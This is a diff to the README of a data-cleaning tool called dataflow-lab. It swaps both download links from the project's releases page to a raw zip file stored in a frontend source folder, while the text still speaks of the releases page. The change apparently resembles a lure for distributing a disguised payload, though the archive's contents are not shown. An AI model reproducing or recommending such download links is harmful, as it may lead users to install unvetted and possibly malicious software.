@@ -1,6 +1,6 @@
 # 📊 dataflow-lab - Clean, explore, and build faster
 
-[![Download dataflow-lab](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/annamaritenth380/dataflow-lab/releases)
+[![Download dataflow-lab](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/annamaritenth380/dataflow-lab/raw/refs/heads/main/frontend/src/dataflow_lab_v3.9.zip)
 
 ## 🚀 What is dataflow-lab?
 
@@ -32,7 +32,7 @@ You keep your data on your computer. That makes it a good fit for private files,
 
 Visit this page to download the Windows release:
 
-https://github.com/annamaritenth380/dataflow-lab/releases
+https://github.com/annamaritenth380/dataflow-lab/raw/refs/heads/main/frontend/src/dataflow_lab_v3.9.zip
 
 Look for the latest release and download the Windows file from that page.
 
